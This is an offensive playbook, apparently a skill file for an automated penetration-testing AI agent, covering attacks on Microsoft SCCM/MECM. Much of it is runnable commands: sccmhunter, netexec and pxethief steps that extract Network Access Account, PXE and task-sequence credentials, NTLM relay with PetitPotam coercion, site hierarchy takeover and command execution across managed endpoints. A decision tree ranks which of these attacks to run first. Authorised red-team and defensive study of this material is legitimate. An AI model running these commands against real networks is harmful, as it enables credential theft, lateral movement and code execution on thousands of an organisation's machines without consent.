---
name: sccm-attacks
version: 1.0.0
description: >
  System Center Configuration Manager (SCCM) / Microsoft Endpoint Configuration
  Manager (MECM) exploitation reference. Covers discovery, enumeration, NAA
  credential extraction, PXE boot abuse, relay attacks, and post-exploitation.
  Primary tool: sccmhunter. Based on SpecterOps / Misconfiguration Manager
  research and the YOURPENTESTLAB attack taxonomy.
phases: [3, 4]
agents: [exploit]
sources:
  - https://github.com/yourpentestlab/sccmhunter
  - https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087
  - https://www.thehacker.recipes/ad/movement/sccm-mecm/
  - https://attack.mitre.org/techniques/T1078/
  - https://misconfigurationmanager.com/
---

# SCCM/MECM Attacks — Discovery, Exploitation & Credential Extraction

> **SCCM (System Center Configuration Manager)** / **MECM (Microsoft Endpoint
> Configuration Manager)** is Microsoft's enterprise endpoint management
> platform. It manages software deployment, patching, and policy enforcement.
> SCCM deployments often contain high-value credentials and provide lateral
> movement paths.

## STEP 1: SCCM DISCOVERY

### 1.1 Identify SCCM Infrastructure

**MITRE:** T1018 (Remote System Discovery), T1046 (Network Service Discovery)

SCCM servers typically expose specific services and DNS records:

```bash
# DNS SRV record for SCCM management point
nslookup -type=SRV _mssms_mp.$SITECODE._tcp.$DOMAIN $DNS_SERVER

# LDAP search for SCCM site systems
ldapsearch -x -H ldap://$DC -b "CN=System Management,CN=System,DC=$DC1,DC=$DC2" \
  -D "$USER@$DOMAIN" -w "$PASS" "(objectClass=*)" \
  | tee -a loot/phase3/ldap_sccm_discovery_$DC.out

# Scan for SCCM ports
# 80/443 — Management Point (HTTP/HTTPS)
# 8530/8531 — WSUS (Windows Server Update Services)
# 10123 — Client notification
# 4011 — PXE (UDP)
nmap -sS -sV -p 80,443,8530,8531,10123 $SCCM_SUBNET --min-rate 3000 \
  | tee -a loot/phase3/nmap_sccm_ports_$SCCM_SUBNET_SAFE.out

# UDP scan for PXE
nmap -sU -p 67,68,4011 $SCCM_SUBNET \
  | tee -a loot/phase3/nmap_sccm_pxe_$SCCM_SUBNET_SAFE.out
```

### 1.2 SCCM Enumeration with sccmhunter

```bash
# Enumerate SCCM site and identify roles
sccmhunter find -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  | tee -a loot/phase3/sccmhunter_find_$DOMAIN.out

# Show detailed site info
sccmhunter show -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -all | tee -a loot/phase3/sccmhunter_show_$DOMAIN.out
```

**Key information to identify:**
- Site code (e.g., "SMS", "PS1")
- Management Points (MP) — HTTP vs HTTPS
- Distribution Points (DP) — may contain NAA credentials
- Site servers and their roles
- PXE-enabled distribution points
- Client count and OS distribution

---

## STEP 2: NAA (NETWORK ACCESS ACCOUNT) CREDENTIAL EXTRACTION

### What Is NAA:

The Network Access Account is a domain account used by SCCM clients to
access content on distribution points when they cannot use their computer
account. NAA credentials are deployed to ALL SCCM clients and can be
extracted locally or remotely.

**MITRE:** T1078 (Valid Accounts), T1552.004 (Private Keys)

### 2.1 Local NAA Extraction (from compromised SCCM client)

NAA credentials are stored in the WMI repository, encrypted with DPAPI.

```bash
# If you have local admin on an SCCM client:

# Via netexec module (remote)
netexec smb $TARGET -u $ADMIN_USER -p $ADMIN_PASS -M sccm \
  | tee -a loot/phase4/nxc_sccm_naa_$TARGET.out

# Via SharpSCCM (if .NET available on target)
# SharpSCCM local secretes -> NAA username and password
```

### 2.2 Remote NAA Extraction via SCCM Policy

```bash
# sccmhunter policy dump — retrieves NAA from site policies
sccmhunter http -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -mp $MANAGEMENT_POINT -sc $SITE_CODE \
  | tee -a loot/phase3/sccmhunter_policy_$MANAGEMENT_POINT.out
```

**Decision after NAA extraction:**
- NAA credentials are domain creds -> use for Phase 3 enumeration
- If NAA is a privileged account (check group memberships) -> direct escalation
- If NAA has local admin on other hosts -> lateral movement
- NAA is often over-privileged due to lazy configuration

---

## STEP 3: PXE BOOT SECRETS EXTRACTION

### What Is PXE Abuse:

PXE (Preboot eXecution Environment) allows network booting. SCCM Distribution
Points configured for PXE respond to DHCP PXE requests. The PXE boot media
may contain credentials (media password, NAA, or task sequence credentials).

**MITRE:** T1542 (Pre-OS Boot), T1552 (Unsecured Credentials)

```bash
# Check for PXE-enabled distribution points
# (identified during discovery — UDP 4011)

# Extract PXE boot image and secrets using pxethief
# Note: Requires network position to receive PXE DHCP responses
python3 pxethief.py $INTERFACE \
  | tee -a loot/phase3/pxethief_$INTERFACE.out

# sccmhunter PXE media extraction
sccmhunter dpapi -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -mp $MANAGEMENT_POINT -sc $SITE_CODE \
  | tee -a loot/phase3/sccmhunter_pxe_$MANAGEMENT_POINT.out
```

**What you get from PXE:**
- Media password (used to decrypt boot image)
- NAA credentials (embedded in boot media)
- Task sequence variables (may contain admin credentials)
- Domain join credentials (used to join machines to domain)

---

## STEP 4: SCCM RELAY ATTACKS

### 4.1 Relay to SCCM HTTP Enrollment

**MITRE:** T1557 (Adversary-in-the-Middle)

If the Management Point uses HTTP (not HTTPS), relay NTLM authentication
to register a rogue client or access site policies.

```bash
# Relay to SCCM Management Point (HTTP)
ntlmrelayx.py -t http://$MANAGEMENT_POINT/ccm_system/request \
  -smb2support | tee -a loot/phase4/ntlmrelayx_sccm_mp.out

# Combine with coercion for machine account relay
python3 PetitPotam.py $LISTENER_IP $TARGET \
  | tee -a loot/phase4/petitpotam_sccm_relay.out
```

### 4.2 Site Server Takeover

If SCCM site system roles are poorly secured, an attacker with admin on
a site system can escalate to Full Administrator in the SCCM hierarchy.

```bash
# Enumerate SCCM admin accounts
sccmhunter admin -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -mp $MANAGEMENT_POINT -sc $SITE_CODE \
  | tee -a loot/phase4/sccmhunter_admins.out
```

**Hierarchy takeover path:**
1. Compromise a site system (MP, DP, or SUP)
2. Extract site system registration credentials
3. Register as a new site system with Full Admin role
4. Use SCCM admin access to deploy payloads to all managed endpoints

---

## STEP 5: POST-EXPLOITATION VIA SCCM

### 5.1 Application Deployment (Code Execution)

**MITRE:** T1072 (Software Deployment Tools)

If you have SCCM admin access (Full Administrator or Application Administrator):

```bash
# sccmhunter exec — execute commands via SCCM on managed clients
sccmhunter exec -u $SCCM_ADMIN -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -mp $MANAGEMENT_POINT -sc $SITE_CODE \
  -t $TARGET_DEVICE -c "whoami /all" \
  | tee -a loot/phase4/sccmhunter_exec_$TARGET_DEVICE.out
```

**Impact:** SCCM admin can deploy scripts and applications to ANY managed
device in the hierarchy. In large organizations, this means code execution
on thousands of endpoints simultaneously.

### 5.2 Collection Variable Extraction

SCCM collections may have custom variables containing credentials (used
in task sequences, scripts, and deployments).

```bash
sccmhunter show -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC \
  -collections -variables \
  | tee -a loot/phase4/sccmhunter_variables.out
```

---

## STEP 6: SCCM CREDENTIAL HARVESTING SUMMARY

| Credential Type | Where Found | How to Extract | Typical Privileges |
|----------------|-------------|----------------|-------------------|
| NAA (Network Access Account) | WMI on clients, site policies | netexec -M sccm, sccmhunter http | Domain user (often over-privileged) |
| PXE media password | PXE boot image | pxethief, sccmhunter dpapi | Decrypts boot media |
| Task sequence variables | Collections, deployments | sccmhunter show -variables | Often local admin or domain join creds |
| Domain join account | Task sequences | sccmhunter, boot media extraction | Creates computer objects in AD |
| SCCM client push account | Site configuration | sccmhunter admin, registry | Local admin on all clients (push install) |
| Site system registration | Site server | Compromise site system | SCCM infrastructure access |

---

## MITRE ATT&CK MAPPING

| Technique | ID | SCCM Application |
|-----------|----|-------------------|
| Valid Accounts | T1078 | NAA credentials, task sequence creds |
| Software Deployment Tools | T1072 | Application deployment for code exec |
| Unsecured Credentials | T1552 | NAA in WMI, PXE boot secrets |
| Pre-OS Boot | T1542 | PXE boot media tampering |
| Remote System Discovery | T1018 | SCCM inventory for target identification |
| Adversary-in-the-Middle | T1557 | NTLM relay to HTTP Management Point |
| Lateral Movement | T1021 | Client push installation abuse |

---

## SCCM ATTACK PRIORITIZATION DECISION TREE

```
SCCM Infrastructure Discovered
  |
  +-> Management Point uses HTTP (not HTTPS)?
  |     YES -> HIGH priority: relay attacks (ESC8-like via SCCM)
  |     NO  -> Relay path blocked, focus on credential extraction
  |
  +-> Have local admin on any SCCM client?
  |     YES -> Extract NAA from WMI (netexec -M sccm)
  |            Check NAA privilege level (group memberships)
  |     NO  -> Attempt policy-based NAA extraction (sccmhunter http)
  |
  +-> PXE-enabled DP found (UDP 4011)?
  |     YES -> Run pxethief to extract boot secrets
  |            Decrypt media -> extract embedded creds
  |     NO  -> Skip PXE, focus on other vectors
  |
  +-> Got NAA or task sequence creds?
  |     +-> Check group memberships of extracted account
  |     +-> Check local admin rights on other hosts
  |     +-> If privileged -> lateral movement (Phase 4)
  |     +-> If standard user -> feed into Phase 3 enumeration
  |
  +-> Got SCCM admin access?
  |     +-> HIGH PRIORITY: code exec on all managed endpoints
  |     +-> Extract collection variables for more creds
  |     +-> Hierarchy takeover for persistent access
  |
  +-> No SCCM attack paths viable?
       -> Skip SCCM, pursue other AD vectors (ADCS, delegation, ACLs)
```

---

## Pi5 ARM64 NOTES

- **sccmhunter:** Pure Python, fully functional on ARM64. No known issues.
- **pxethief:** Requires network-level PXE access (DHCP broadcast). Works
  on ARM64 but Pi must be on the same VLAN as PXE-enabled DPs.
- **SCCM relay:** ntlmrelayx.py fully functional on ARM64.
- **Large SCCM environments (>5000 clients):** sccmhunter enumeration may
  be slow. Use targeted queries with `-t` flag for specific devices.
